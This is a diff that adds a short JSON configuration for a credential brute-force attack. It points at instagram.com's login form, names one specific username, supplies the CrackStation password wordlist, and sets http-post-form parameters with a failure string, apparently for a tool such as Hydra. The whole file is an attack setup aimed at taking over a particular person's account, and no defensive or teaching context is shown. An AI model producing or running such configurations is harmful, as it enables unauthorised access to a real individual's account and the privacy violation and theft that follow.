@@ -1,0 +1,7 @@
+{
+    "target": "instagram.com",
+    "username": "imogenharringtonnnn",
+    "password_list": "~/wordlists/crackstation.txt",
+    "protocol": "http-post-form",
+    "params": "/accounts/login/:username=^USER^&password=^PASS^:F=incorrect"
+}
